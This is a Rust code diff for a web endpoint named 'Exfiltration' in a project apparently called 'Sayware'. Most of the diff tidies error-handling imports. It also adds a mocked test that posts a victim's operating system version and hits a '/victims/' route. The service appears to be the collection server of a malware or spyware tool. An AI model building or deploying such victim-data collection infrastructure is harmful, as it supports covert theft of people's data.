@@ -4,8 +4,7 @@
 
 use crate::State;
 use poem::{
-    Result,
-    error::InternalServerError,
+    Result, error,
     web::{Data, RemoteAddr},
 };
 use poem_openapi::{OpenApi, payload::Json};
@@ -48,9 +47,9 @@ impl Exfiltration {
             ))
             .send()
             .await
-            .map_err(InternalServerError)?
+            .map_err(error::InternalServerError)?
             .error_for_status()
-            .map_err(InternalServerError)?
+            .map_err(error::InternalServerError)?
             .json::<InstanceData>()
             .await
             .unwrap_or(InstanceData::default());
@@ -67,9 +66,9 @@ impl Exfiltration {
             .json(&instance_data)
             .send()
             .await
-            .map_err(InternalServerError)?
+            .map_err(error::InternalServerError)?
             .error_for_status()
-            .map_err(InternalServerError)?;
+            .map_err(error::InternalServerError)?;
 
         let identifier = Uuid::new_v4();
 
@@ -93,10 +92,67 @@ impl Exfiltration {
             })
             .send()
             .await
-            .map_err(InternalServerError)?
+            .map_err(error::InternalServerError)?
             .error_for_status()
-            .map_err(InternalServerError)?;
+            .map_err(error::InternalServerError)?;
 
         Ok(())
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use crate::{
+        State,
+        api::routes::{Exfiltration, exfiltration::InstanceData},
+    };
+    use poem::{EndpointExt, Route, test::TestClient};
+    use poem_openapi::OpenApiService;
+    use reqwest::Client;
+    use uuid::Uuid;
+    use wiremock::{Mock, MockServer, ResponseTemplate, matchers};
+
+    #[tokio::test]
+    async fn test_send_exfiltrated_data() {
+        let mock_server = MockServer::start().await;
+        let instance_identifier = Uuid::new_v4();
+
+        Mock::given(matchers::method("GET"))
+            .and(matchers::path_regex(r"/instances/.*"))
+            .respond_with(ResponseTemplate::new(200).set_body_json(InstanceData {
+                connection_number: 5,
+            }))
+            .mount(&mock_server)
+            .await;
+
+        Mock::given(matchers::method("PUT"))
+            .and(matchers::path_regex(r"/instances/.*"))
+            .respond_with(ResponseTemplate::new(200))
+            .mount(&mock_server)
+            .await;
+
+        Mock::given(matchers::method("POST"))
+            .and(matchers::path_regex(r"/victims/.*"))
+            .respond_with(ResponseTemplate::new(200))
+            .mount(&mock_server)
+            .await;
+
+        let state = State {
+            proxy: Client::new(),
+            proxy_url: mock_server.uri().parse().unwrap(),
+            instance_identifier,
+        };
+
+        let api = OpenApiService::new(Exfiltration, "Sayware", "0.1.0");
+        let application = Route::new().nest("/", api).data(state);
+        let client = TestClient::new(application);
+
+        client
+            .post("/")
+            .header("Content-Type", "application/json")
+            .body(r#"{"operating_system_version": "Windows 10.0 19045"}"#)
+            .send()
+            .await
+            .assert_status_is_ok();
     }
 }
